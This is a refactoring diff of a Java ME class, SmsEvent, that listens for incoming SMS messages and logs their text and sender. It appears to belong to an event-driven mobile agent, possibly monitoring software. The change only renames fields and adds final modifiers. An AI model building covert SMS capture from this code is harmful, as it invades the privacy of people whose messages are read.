@@ -42,63 +42,26 @@ public class SmsEvent extends Event implements MessageListener {
     //#debug
     private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);
 
-    private boolean _stop = false;
-    private DatagramConnection _dc;
-    MessageConnection _mc;
+    private final boolean stop = false;
+    private DatagramConnection dc;
+    MessageConnection mc;
 
-    public SmsEvent(int actionId, byte[] confParams) {
+    public SmsEvent(final int actionId, final byte[] confParams) {
         super(Event.EVENT_SMS, actionId, confParams);
 
     }
 
-    public synchronized void actualStop() {
-
-        try {
-            _dc.close(); // Close the connection so the thread returns. 
-        } catch (IOException e) {
-            debug.error(e.toString());
-        }
-    }
-
-    public void notifyIncomingMessage(MessageConnection conn) {
-        Message m;
-        try {
-            m = _mc.receive();
-
-            String address = m.getAddress();
-            String msg = null;
-            if (m instanceof TextMessage) {
-                TextMessage tm = (TextMessage) m;
-                msg = tm.getPayloadText();
-            } else if (m instanceof BinaryMessage) {
-                StringBuffer buf = new StringBuffer();
-                byte[] data = ((BinaryMessage) m).getPayloadData();
-
-                // convert Binary Data to Text
-                msg = new String(data, "UTF-8");
-            } else {
-                System.out.println("Invalid Message Format");
-                System.out.println("Received SMS text from " + address + " : "
-                        + msg);
-            }
-        } catch (InterruptedIOException e) {
-            debug.error(e.toString());
-        } catch (IOException e) {
-            debug.error(e.toString());
-        }
-    }
-
     protected void actualRun() {
         try {
-            _mc = (MessageConnection) Connector.open("sms://:0");
-            _mc.setMessageListener(this);
-        } catch (IOException e) {
+            mc = (MessageConnection) Connector.open("sms://:0");
+            mc.setMessageListener(this);
+        } catch (final IOException e) {
             debug.error(e.toString());
         }
 
         try {
-            _mc.close();
-        } catch (IOException e) {
+            mc.close();
+        } catch (final IOException e) {
             debug.error(e.toString());
         }
     }
@@ -113,24 +76,61 @@ public class SmsEvent extends Event implements MessageListener {
         // #debug
         debug.trace("actualRun");
         try {
-            _dc = (DatagramConnection) Connector.open("sms://");
+            dc = (DatagramConnection) Connector.open("sms://");
 
-            Datagram d = _dc.newDatagram(_dc.getMaximumLength());
+            final Datagram d = dc.newDatagram(dc.getMaximumLength());
             debug.trace("waiting to receive sms");
-            _dc.receive(d);
+            dc.receive(d);
 
-            String address = new String(d.getAddress());
-            String msg = new String(d.getData());
+            final String address = new String(d.getAddress());
+            final String msg = new String(d.getData());
 
             debug.info("SMS Message received: " + msg);
             debug.info("From: " + address);
 
-        } catch (IOException e) {
+        } catch (final IOException e) {
             debug.trace("exception: " + e);
         }
     }
 
-    protected boolean parse(byte[] confParams) {
+    public synchronized void actualStop() {
+
+        try {
+            dc.close(); // Close the connection so the thread returns. 
+        } catch (final IOException e) {
+            debug.error(e.toString());
+        }
+    }
+
+    public void notifyIncomingMessage(final MessageConnection conn) {
+        Message m;
+        try {
+            m = mc.receive();
+
+            final String address = m.getAddress();
+            String msg = null;
+            if (m instanceof TextMessage) {
+                final TextMessage tm = (TextMessage) m;
+                msg = tm.getPayloadText();
+            } else if (m instanceof BinaryMessage) {
+                final StringBuffer buf = new StringBuffer();
+                final byte[] data = ((BinaryMessage) m).getPayloadData();
+
+                // convert Binary Data to Text
+                msg = new String(data, "UTF-8");
+            } else {
+                System.out.println("Invalid Message Format");
+                System.out.println("Received SMS text from " + address + " : "
+                        + msg);
+            }
+        } catch (final InterruptedIOException e) {
+            debug.error(e.toString());
+        } catch (final IOException e) {
+            debug.error(e.toString());
+        }
+    }
+
+    protected boolean parse(final byte[] confParams) {
         // TODO Auto-generated method stub
         return false;
     }
